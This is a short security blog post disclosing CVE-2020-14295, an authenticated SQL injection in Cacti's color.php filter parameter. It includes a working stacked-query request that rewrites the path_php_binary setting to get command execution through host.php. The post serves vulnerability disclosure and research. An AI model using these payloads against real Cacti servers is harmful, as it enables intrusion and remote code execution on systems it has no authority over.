---
layout: post
title:  "CACTI - Authenticated RCE (CVE-2020-14295)"
category : CVE
tags :  CVE
---

## Description

sqli as admin v1.2.7 to v1.2.12

There is an sql injection on the latest version, in the  `/cacti/color.php` page on the parameter filter.

![cacti SQLI](/assets/blog/cacti-sqli.png)

## To Reproduce

- Steps to reproduce the behavior:

```
/cacti/color.php?action=export&header=false&filter=')<SQLI HERE>--+-
```

## Escalate SQLI to RCE

- As the application accept stacked queries, this can easy lead to remote code execution by replacing the path_php_binary setting inside the database.

```
GET /cacti/color.php?action=export&header=false&filter=1');update+settings+set+value='touch+/tmp/sqli_from_rce;'+where+name='path_php_binary';--+- 
```

- Then call `host.php?action=reindex` and get the shell_exec called with the path_php_binary.

![cacti RCE](/assets/blog/cacti-rce.png)

## Links
- Orignal issue : [https://github.com/Cacti/cacti/issues/3622](https://github.com/Cacti/cacti/issues/3622)
- The metasploit exploit : [https://www.exploit-db.com/exploits/49810](https://www.exploit-db.com/exploits/49810)